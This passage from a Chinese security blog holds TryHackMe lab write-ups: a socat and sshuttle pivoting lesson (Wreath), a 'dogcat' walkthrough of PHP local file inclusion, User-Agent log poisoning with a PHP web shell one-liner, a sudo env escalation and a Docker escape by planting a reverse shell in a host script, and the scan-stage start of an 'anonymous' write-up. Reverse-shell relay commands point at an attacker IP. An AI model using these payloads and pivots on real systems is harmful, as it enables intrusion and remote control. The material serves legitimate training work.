href="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" title="Demonstration of using cURL with a Python HTTP server to upload files" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" alt="Demonstration of using cURL with a Python HTTP server to upload files"></a></p><p>上传二进制文件后，让我们依次看一下上述每个场景。</p><p><em><strong>注意：</strong>这将上传标题中带有您的用户名的 socat 二进制文件;但是，此任务其余部分给出的示例命令将二进制文件简称为</em> <em>.</em><code>socat</code>  </p><hr><p><strong>Reverse Shell 继电器</strong></p><p>在这个场景中，我们使用 socat 创建一个中继，以便我们将反向 shell 发送回我们自己的攻击机器（如上图所示）。首先，让我们在攻击框 （） 上启动一个标准的 netcat 监听器。接下来，在受损的服务器上，使用以下命令启动中继：<code>sudo nc -lvnp 443</code><br><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &amp;   </code></p><p><em><strong>注意：</strong>这两个地址的顺序在这里很重要。确保先打开侦听端口，_然后再_连接回攻击机器。</em>  </p><p>然后，我们可以从这里创建一个反向 shell，指向受感染服务器上新打开的端口 8000。以下屏幕截图演示了这一点，在远程服务器上使用 netcat 模拟从目标服务器接收反向 shell：</p><p><a href="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" title="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png" alt="Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell"></a></p><p>上述命令的简要说明：</p><ul><li><code>tcp-l:8000</code>用于创建连接的前半部分 – 目标计算机的 TCP 端口 8000 上的 IPv4 侦听器。</li><li><code>tcp:ATTACKING_IP:443</code>在端口 443 上连接回我们的本地 IP。显然，需要正确填写ATTACKING_IP才能正常工作。</li><li><code>&amp;</code>将侦听器置于后台，将其转换为 Job，以便我们仍然可以使用 shell 来执行其他命令。</li></ul><p>中继连接回使用标准 netcat 侦听器的别名启动的侦听器：。<code>sudo nc -lvnp 443</code>  </p><p>通过这种方式，我们可以设置一个中继，通过受感染的系统发送反向 shell，回到我们自己的攻击机器。这种技术也可以很容易地被链接起来;但是，在许多情况下，仅上传 Netcat 的静态副本以直接在受感染的服务器上接收反向 shell 可能更容易。</p><hr><p><strong>端口转发 – Easy</strong></p><p><a href="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png"></a>使用 socat 设置端口转发的快速简便的方法非常简单，就是在受感染的服务器上打开一个侦听端口，并将进入其中的任何内容重定向到目标服务器。例如，如果受损的服务器是 172.16.0.5，目标是 172.16.0.10 的端口 3306，我们可以使用以下命令（在受损的服务器上）创建端口转发：<br><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &amp;   </code></p><p>这会在受感染的服务器上打开端口 33060，并将来自攻击机器的输入直接重定向到预期的目标服务器，基本上让我们可以访问在我们的目标 172.16.0.10 上运行的（可能是 MySQL 数据库）。该选项用于将每个连接放入新进程中，该选项表示在建立连接后端口保持打开状态。它们结合起来，允许我们对多个连接使用相同的端口转发。我们再次用于 shell 的后台，允许我们在受感染的服务器上继续使用相同的终端会话来处理其他事情。<code>fork``reuseaddr``&amp;</code></p><p>现在，我们可以连接到中继 （172.16.0.5） 上的端口 33060，并将我们的连接直接中继到我们的预期目标 172.16.0.10：3306。</p><hr><p><strong>端口转发 – 安静</strong></p><p>以前的技术既快速又简单，但它也会在受感染的服务器上打开一个端口，该端口可能会被任何类型的主机或网络扫描发现。虽然风险并不_大_，但了解一种稍微安静的 socat 端口转运方法是值得的。此方法稍微复杂一些，但不需要在受感染的服务器上从外部打开端口。</p><p>首先，在我们自己的攻击机器上，我们发出以下命令：<br><code>socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &amp;</code></p><p>这将打开两个端口：8000 和 8001，从而创建一个本地端口中继。进入其中一个的东西会从另一个出来。因此，端口 8000 还设置了 and 选项，以允许我们使用此端口转发创建多个连接。<code>fork``reuseaddr</code></p><p>接下来，在受损的中继服务器（上一个示例中为 172.16.0.5）上，我们执行以下命令：<br><code>./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &amp;   </code></p><p>这会在攻击机器上的监听端口 8001 和目标服务器的开放端口之间建立连接。要使用之前的虚构网络，我们可以输入以下命令：<br><code>./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &amp;   </code></p><p>这将在我们的攻击机器上的端口 8000 和预期目标 （172.16.0.10） 上的端口 80 之间创建一个链接，这意味着我们可以在攻击机器的 Web 浏览器中加载目标提供的网页：172.16.0.10：80！<code>localhost:8000</code></p><p>这是一个相当复杂的可视化场景，因此让我们快速了解一下当您尝试在浏览器中访问网页时会发生什么：</p><p><a href="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png"></a></p><ul><li>请求将转到<code>127.0.0.1:8000</code></li><li>由于我们在自己的机器上启动了 socat 侦听器，任何进入端口 8000 的东西都会从端口 8001 出来</li><li>端口 8001 直接连接到我们在受感染服务器上运行的 socat 进程，这意味着从端口 8001 传出的任何内容都会被发送到受感染的服务器，在那里它被中继到目标服务器上的端口 80。</li></ul><p>然后，当目标发送响应时，该过程将反转：</p><ul><li>响应将发送到受感染服务器上的 socat 进程。进入进程的内容从另一端出来，恰好直接链接到我们攻击机器上的端口 8001。</li><li>进入我们攻击机器上端口 8001 的任何内容都来自我们攻击机器上的端口 8000，这是 Web 浏览器希望接收其响应的地方，因此页面被接收和呈现。</li></ul><p>我们现在实现了与以前相同的目标，但没有在服务器上打开任何端口！  </p><hr><p>最后，我们已经学习了如何_创建_后台 socat 端口转发和中继，但知道如何_关闭_它们也很重要。解决方案很简单：在终端中运行命令，然后使用 ：<code>jobs``kill %NUMBER</code></p><p><a href="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" title="Demonstration for how to kill background jobs" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" alt="Demonstration for how to kill background jobs"></a></p><p>这个工具与我们到目前为止介绍的其他工具完全不同。它不执行端口转发，它创建的代理与我们已经看到的完全不同。相反，它使用 SSH 连接来创建隧道代理，其作用类似于新接口。简而言之，它模拟了一个 VPN，允许我们通过代理路由我们的流量_，而无需使用 proxychains_（或等效的）。我们可以像通常连接到联网设备一样直接连接到目标网络中的设备。由于它通过 SSH（安全 shell）创建隧道，因此我们通过隧道发送的任何内容也被加密，这是一个不错的奖励。我们完全在攻击机器上使用 sshutt，就像我们通过 SSH 连接到远程服务器一样。  </p><p>虽然这听起来像是一个令人难以置信的升级，但它并非没有缺点。首先，sshuttle 仅适用于 Linux 目标。它还需要通过 SSH 访问受感染的服务器，并且还需要在服务器上安装 Python。也就是说，通过 SSH 访问，理论上可以上传 Python 的静态副本并使用它。这些限制确实在一定程度上限制了 sshuttle 的用途;然而，当_它是一个_选项时，它往往是一个极好的赌注！</p><p>首先，我们需要安装 sshuttle。在 Kali 上，这就像使用包管理器一样简单：<code>apt</code><br><code>sudo apt install sshuttle</code>  </p><hr><p>使用 sshuttle 连接到服务器的基本命令如下：<br><code>sshuttle -r username@address subnet</code>   </p><p>例如，在我们虚构的 172.16.0.x 网络中，服务器位于 172.16.0.5 并遭到入侵，命令可能如下所示：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24</code>  </p><p>然后，系统会要求我们输入用户的密码，并建立代理。然后，该工具将被动地位于后台，并将相关流量转发到目标网络。  </p><p>除了指定子网，我们还可以使用选项，该选项尝试根据受感染服务器自己的路由表自动确定它们：<code>-N</code><br><code>sshuttle -r username@address -N</code>  </p><p>请记住，这可能并不总是成功的！  </p><p>与以前的工具一样，这些命令也可以通过在末尾附加 &amp; （） 符号来作为后台。<code>&amp;</code></p><p>如果这有效，您应该会看到以下行：<br><code>c : Connected to server.</code>  </p><hr><p>嗯，这很好，但是如果我们没有用户的密码，或者服务器只接受基于密钥的身份验证，会发生什么情况呢？</p><p>不幸的是，sshuttle 目前似乎没有指定用于向服务器进行身份验证的私钥的简写。也就是说，我们可以使用开关轻松绕过此限制。<code>--ssh-cmd</code></p><p>此开关允许我们指定在尝试对受感染的服务器进行身份验证时由 sshuttle 执行的命令。默认情况下，这没有参数。通过开关，我们可以选择不同的命令来执行身份验证：例如，，！<code>ssh``--ssh-cmd``ssh -i keyfile</code></p><p>因此，当使用基于密钥的身份验证时，最终命令如下所示：<br><code>sshuttle -r user@address --ssh-cmd &quot;ssh -i KEYFILE&quot; SUBNET</code>  </p><p>使用我们之前的示例，命令将是：<br><code>sshuttle -r user@172.16.0.5 --ssh-cmd &quot;ssh -i private_key&quot; 172.16.0.0/24</code>  </p><hr><p><strong>请注意：</strong>使用 sshuttle 时，您可能会遇到如下所示的错误：<br><code>client: Connected.   client_loop: send disconnect: Broken pipe   client: fatal: server died with error code 255</code>  </p><p>当您连接到的受感染计算机是您尝试访问的子网的一部分时，可能会发生这种情况。例如，如果我们连接到 172.16.0.5 并尝试转发 172.16.0.0&#x2F;24，那么我们会将受感染的服务器包含在新转发的子网中，从而中断连接并导致工具死机。</p><p>为了解决这个问题，我们告诉 sshuttle 使用交换机从子网范围中排除受感染的服务器。<code>-x</code></p><p>使用我们之前的示例：<br><code>sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5</code>  </p><p>这将允许 sshuttle 在不中断自身的情况下创建连接。</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p><a href="/../assets/img/Pasted%20image%2020241121165626.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121165626.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241121170006.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121170006.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241121170243.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121170243.png"></a></p><p>代理隧道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshuttle -r root@10.200.85.200 --ssh-cmd &quot;ssh -i id_rsa&quot; 10.200.85.200/24 -x 10.200.85.200</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121171018.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121171018.png"></a></p><h2 id="📚-知识点回顾"><a href="#📚-知识点回顾" class="headerlink" title="📚 知识点回顾"></a>📚 知识点回顾</h2><ul><li><strong>信息搜集技巧</strong>：<ul><li>端口扫描与服务枚举技巧。</li><li>Web 漏洞检测技巧（SQL 注入、XSS 等）。</li></ul></li><li><strong>漏洞利用技巧</strong>：<ul><li>如何使用 Metasploit 或自行编写漏洞利用脚本。</li><li>获取反向 shell 与持续访问。</li></ul></li><li><strong>Post-Exploitation 技巧</strong>：<ul><li>获取目标的敏感信息和访问权限。</li><li>提升权限，进行横向移动。</li></ul></li></ul><hr><h2 id="🧳-攻击链与流程图"><a href="#🧳-攻击链与流程图" class="headerlink" title="🧳 攻击链与流程图"></a>🧳 攻击链与流程图</h2><ul><li>可视化渗透测试的整体攻击过程，确保每一步都清晰。</li></ul><hr><h2 id="📅-总结"><a href="#📅-总结" class="headerlink" title="📅 总结"></a>📅 总结</h2><ul><li><strong>成功步骤</strong>：简要描述成功的渗透测试步骤和关键点。</li><li><strong>遇到的困难与挑战</strong>：列出在过程中遇到的难点及解决方案。</li><li><strong>后续建议</strong>：对靶场的进一步探索或防御建议。</li></ul></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dogcat</title>
      <link href="/2024/11/20/dogcat/"/>
      <url>/2024/11/20/dogcat/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>从本地文件包含到getshell</p></blockquote><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p><strong>难度</strong>：中<br><strong>描述</strong>：我创建了一个网站，您可以在其中查看狗和&#x2F;或猫的照片！通过 LFI 利用 PHP 应用程序并突破 Docker 容器。 </p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.200.120</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>端口扫描<br> 22,80 </li><li>路径探测<br> <a href="/../assets/img/Pasted%20image%2020241120235951.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241120235951.png"></a></li><li>服务枚举<br> 无</li></ol><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h3><p>80端口web服务为攻击点<br>猜测</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$dir = $_GET[&quot;view&quot;] .&#x27;.php&#x27;;</span><br><span class="line">include($dir);</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121002029.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121002029.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121002212.png" title="payload" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121002212.png" alt="payload"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">containsStr</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$substr</span></span>) </span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="variable">$substr</span>) !== <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="variable">$ext</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;ext&quot;</span>] : <span class="string">&#x27;.php&#x27;</span>; <span class="comment">//不传递ext 默认为php文件 读取passwd 需要传递 ext</span></span><br><span class="line">           <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])) &#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;dog&#x27;</span>) || <span class="title function_ invoke__">containsStr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>], <span class="string">&#x27;cat&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&#x27;Here you go!&#x27;</span>;</span><br><span class="line">                   <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>] . <span class="variable">$ext</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">&#x27;Sorry, only dogs or cats are allowed.&#x27;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241121000130.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121000130.png"></a><br>    <a href="/../assets/img/Pasted%20image%2020241121001227.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121001227.png"></a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>user-agent 利用</p><p><a href="/../assets/img/Pasted%20image%2020241121004940.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121004940.png"></a></p><h3 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h3><h3 id="信息审计"><a href="#信息审计" class="headerlink" title="信息审计"></a>信息审计</h3><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>反弹webshell<br><a href="/../assets/img/Pasted%20image%2020241121005119.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005119.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121005140.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005140.png"></a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://gtfobins.github.io/gtfobins/env/#shell">https://gtfobins.github.io/gtfobins/env/#shell</a><br><a href="/../assets/img/Pasted%20image%2020241121005701.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121005701.png"></a><br>值得注意的是这是个docker 环境</p><p><a href="/../assets/img/Pasted%20image%2020241121010042.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010042.png"></a><br><a href="/../assets/img/Pasted%20image%2020241121010217.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010217.png"></a></p><p>宿主主机会这些这个bashup.sh 可以尝试把revbash 加到sh文件</p><p><a href="/../assets/img/Pasted%20image%2020241121010737.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121010737.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><p>思路总结下：</p><p>利用点：<br>本地文件包含 <code>LFI</code><br>目录确定 后读取index文件，进行代码审计非php文件需要读取传参ext<br>读取apache2 &#x2F;nginx 的访问文件，然后修改useragent 头注入一句话木马,然后反弹shell<br>容器内提权 sudo env<br>docker 逃逸 sh脚本反弹shell</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
            <tag> LFI </tag>
            
            <tag> Docker逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>anonymous</title>
      <link href="/2024/11/20/anonymous/"/>
      <url>/2024/11/20/anonymous/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：middle<br>描述：<br>尝试获取两个标志！扎根机器并证明您对基础知识的理解！这是一个面向初学者的虚拟机。获取这两个标志需要一些 Linux 和权限提升方法的基本知识。</p></blockquote><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.226.88</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ naabu -host 10.10.226.88</span><br><span class="line"></span><br><span class="line">                  __</span><br><span class="line">  ___  ___  ___ _/ /  __ __</span><br><span class="line"> / _ \/ _ \/ _ \/ _ \/ // /</span><br><span class="line">/_//_/\_,_/\_,_/_.__/\_,_/</span><br><span class="line"></span><br><span class="line">                projectdiscovery.io</span><br><span class="line"></span><br><span class="line">[INF] Current naabu version 2.3.1 (outdated)</span><br><span class="line">[INF] Running CONNECT scan with non root privileges</span><br><span class="line">10.10.226.88:445</span><br><span class="line">10.10.226.88:21</span><br><span class="line">10.10.226.88:139</span><br><span class="line">10.10.226.88:22</span><br><span class="line">[INF] Found 4 ports on host 10.10.226.88 (10.10.226.88)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>指纹扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCV -p 21,22,139,445 10.10.226.88 --min-rate 10000</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.17.5.121</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2024-11-20T14:30:58+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-11-20T14:30:58</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 22.17 seconds</span><br></pre></td></tr></table></figure><h3 id="扫描总结："><a href="#扫描总结：" class="headerlink" title="扫描总结："></a>扫描总结：</h3><ol><li><strong>目标主机</strong>：<ul><li>IP 地址：<code>10.10.226.88</code></li><li>主机状态：在线，延迟 0.27s</li><li>操作系统：Linux，使用 Samba 服务模拟 Windows 信息（版本 Samba 4.7.6）</li></ul></li></ol><hr><ol start="2"><li><strong>端口信息</strong>：<ul><li><p>**21&#x2F;tcp (FTP)**：</p><ul><li>服务：vsftpd 3.0.3</li><li>特性：<ul><li>支持匿名登录（Anonymous FTP）</li><li>存在一个可写目录：<code>/scripts</code></li><li>没有会话带宽限制</li></ul></li><li>安全性：匿名登录与可写目录可能存在敏感信息或恶意文件上传的风险。</li></ul></li><li><p>**22&#x2F;tcp (SSH)**：</p><ul><li>服务：OpenSSH 7.6p1 (Ubuntu)</li><li>支持协议：SSH 2.0</li><li>Hostkey 类型：RSA、ECDSA、ED25519</li><li>安全性：未显示明显漏洞，但可尝试弱口令或暴力破解测试。</li></ul></li><li><p>**139&#x2F;tcp 和 445&#x2F;tcp (SMB)**：</p><ul><li>服务：Samba 文件共享服务</li><li>版本：Samba 4.7.6-Ubuntu</li><li>特性：<ul><li>NetBIOS 名称：<code>ANONYMOUS</code></li><li>工作组：<code>WORKGROUP</code></li><li>认证模式：用户级别认证，但消息签名被禁用（不安全）</li><li>系统时间：<code>2024-11-20T14:30:58</code></li></ul></li></ul></li></ul></li></ol><hr><ol start="3"><li><strong>潜在风险</strong>：<ul><li>FTP 匿名登录和可写目录可能被用于上传恶意文件。</li><li>SMB 消息签名被禁用，可能受到中间人攻击。</li><li>可以进一步枚举 SMB 服务，查看是否存在敏感共享目录。</li><li>端口 22 可以尝试基于暴力破解或默认凭据的测试。</li></ul></li></ol><hr><p><strong>下一步建议</strong>：</p><ol><li><p><strong>针对 FTP</strong>：</p><ul><li>登录匿名 FTP，检查可用文件或上传测试文件验证是否支持写入。</li><li>检查 <code>/scripts</code> 目录下是否存在敏感文件。</li></ul></li><li><p><strong>针对 SMB</strong>：</p><ul><li>使用 <code>smbclient</code> 或其他工具进一步枚举共享资源。</li><li>确认是否有未授权访问的目录或敏感数据。</li></ul></li><li><p><strong>针对 SSH</strong>：</p><ul><li>尝试弱口令暴力破解或利用已知漏洞进行测试。</li></ul></li><li><p><strong>综合测试</strong>：</p><ul><li>针对 SMB 和 FTP 的未授权访问，重点检查是否泄露敏感信息或配置文件。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~]</span><br><span class="line">└─$ cat clean.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span 